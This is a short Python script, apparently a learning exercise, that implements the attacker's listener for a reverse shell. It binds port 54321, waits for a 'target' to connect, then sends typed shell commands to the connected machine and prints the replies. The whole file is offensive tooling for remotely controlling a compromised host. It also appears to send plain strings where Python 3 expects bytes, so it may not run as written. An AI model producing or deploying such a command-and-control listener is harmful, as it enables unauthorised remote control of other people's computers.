import socket

# reread the documentation of socket library
# declaration of the socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# bind the port and the host
# the port number doesn't matter as long there is nothing on it
# find the right ip address before starting the server
ipaddress = ""

s.bind((ipaddress, 54321))

# the socket will listen to five connection
s.listen(5)

print("Listening for incoming connection")

target, ip = s.accept()

print("Target Connected !")
while True:
    # creation of simple command
    command = input("* Shell#-%s: " % str(ip))
    # send the command
    target.send(
        command
    )
    if command == "q":
        break
    else:
        answer = target.recv(1024)
        # print the answer from the reverse shell
        print(answer)

# close the connection
s.close()
